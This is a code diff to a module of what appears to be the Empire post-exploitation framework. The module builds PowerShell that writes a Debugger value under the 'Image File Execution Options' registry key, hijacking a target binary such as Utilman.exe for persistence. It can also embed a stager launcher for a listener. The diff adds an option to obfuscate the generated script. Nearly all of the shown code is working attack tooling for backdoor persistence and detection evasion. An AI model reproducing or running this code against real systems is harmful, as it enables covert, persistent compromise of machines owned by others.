@@ -1,3 +1,4 @@
+import os.path
 from lib.common import helpers
 
 class Module:
@@ -16,13 +17,13 @@ class Module:
             'Background' : False,
 
             'OutputExtension' : None,
-            
+
             'NeedsAdmin' : True,
 
             'OpsecSafe' : False,
-            
+
             'MinPSVersion' : '2',
-            
+
             'Comments': [ ]
         }
 
@@ -73,10 +74,10 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
 
         # management options
-        cleanup = self.options['Cleanup']['Value']        
+        cleanup = self.options['Cleanup']['Value']
         triggerBinary = self.options['TriggerBinary']['Value']
         listenerName = self.options['Listener']['Value']
         targetBinary = self.options['TargetBinary']['Value']
@@ -92,7 +93,7 @@ class Module:
             # the registry command to disable the debugger for Utilman.exe
             script = "Remove-Item 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s';'%s debugger removed.'" %(targetBinary, targetBinary)
             return script
-        
+
 
         if listenerName != '':
             # if there's a listener specified, generate a stager and store it
@@ -105,7 +106,7 @@ class Module:
             else:
                 # generate the PowerShell one-liner
                 launcher = self.mainMenu.stagers.generate_launcher(listenerName)
-                
+
                 encScript = launcher.split(" ")[-1]
                 # statusMsg += "using listener " + listenerName
 
@@ -128,5 +129,9 @@ class Module:
         else:
             # the registry command to set the debugger for the specified binary to be the binary path specified
             script = "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"' -Name Debugger -Value '"+triggerBinary+"';'"+targetBinary+" debugger set to "+triggerBinary+"'"
-
+        if obfuscate:
+            script = helpers.obfuscate(psScript=script, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
         return script
+
+    def obfuscate(self, obfuscationCommand="", forceReobfuscation=False):
+        return
